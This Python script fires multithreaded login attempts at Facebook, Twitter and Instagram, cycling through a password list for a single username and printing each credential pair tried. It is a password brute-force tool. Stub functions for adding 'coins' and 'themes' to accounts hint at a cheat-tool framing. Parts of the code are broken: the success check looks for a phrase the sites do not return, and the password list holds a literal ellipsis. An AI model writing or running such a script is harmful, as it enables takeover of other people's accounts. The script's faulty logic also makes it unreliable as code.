import requests
import threading

def login(username, password, platform):
    if platform == "facebook":
        url = "https://www.facebook.com/login.php"
        data = {"email": username, "pass": password}
    elif platform == "twitter":
        url = "https://twitter.com/sessions"
        data = {"username": username, "password": password}
    elif platform == "instagram":
        url = "https://www.instagram.com/accounts/login/ajax/"
        data = {"username": username, "password": password}
    else:
        print(f"Unsupported platform: {platform}")
        return

    try:
        response = requests.post(url, data=data)
        if "Login Successful" in response.text:
            print(f"Login successful for {username}:{password} on {platform}")
            add_coins(username, platform)
            add_theme(username, platform)
        else:
            print(f"Login failed for {username}:{password} on {platform}")
    except requests.exceptions.RequestException as e:
        print(f"Error occurred during login: {str(e)}")

def add_coins(username, platform):
    if platform == "facebook":
        # Add coins to Facebook account
        pass
    elif platform == "twitter":
        # Add coins to Twitter account
        pass
    elif platform == "instagram":
        # Add coins to Instagram account
        pass
    else:
        print(f"Unsupported platform: {platform}")
        return

def add_theme(username, platform):
    if platform == "facebook":
        # Add theme to Facebook account
        pass
    elif platform == "twitter":
        # Add theme to Twitter account
        pass
    elif platform == "instagram":
        # Add theme to Instagram account
        pass
    else:
        print(f"Unsupported platform: {platform}")
        return

def main():
    username = "your_username"
    password_list = ["password1", "password2", "password3", ...]  # Add more passwords
    platforms = ["facebook", "twitter", "instagram"]  # Add more platforms as needed

    for platform in platforms:
        for password in password_list:
            thread = threading.Thread(target=login, args=(username, password, platform))
            thread.start()

if __name__ == "__main__":
    main()
